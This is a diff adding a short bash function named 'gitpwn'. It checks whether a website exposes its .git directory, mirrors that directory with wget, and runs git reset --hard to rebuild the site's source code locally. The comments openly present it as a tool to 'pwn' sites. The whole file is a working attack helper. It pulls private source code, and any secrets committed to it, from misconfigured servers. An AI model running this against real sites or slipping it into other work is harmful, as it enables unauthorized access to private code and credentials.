@@ -1,0 +1,13 @@
+# pass a url eg. http://example.com/.git and it will try
+# to see if it can pwn that site/dir
+gitpwn() {
+  if wget -qO- "${1}" &> /dev/null; then
+    echo "Found open .git dir.. performing gitpwnage"
+    wget -q --mirror --include-directories=/.git "${1}"
+    domain=$(awk -F/ '{print $3}' <<< $1)
+    cd "${domain}"
+    git reset --hard
+  else
+    echo -e "Could not pwn that site"
+  fi
+}
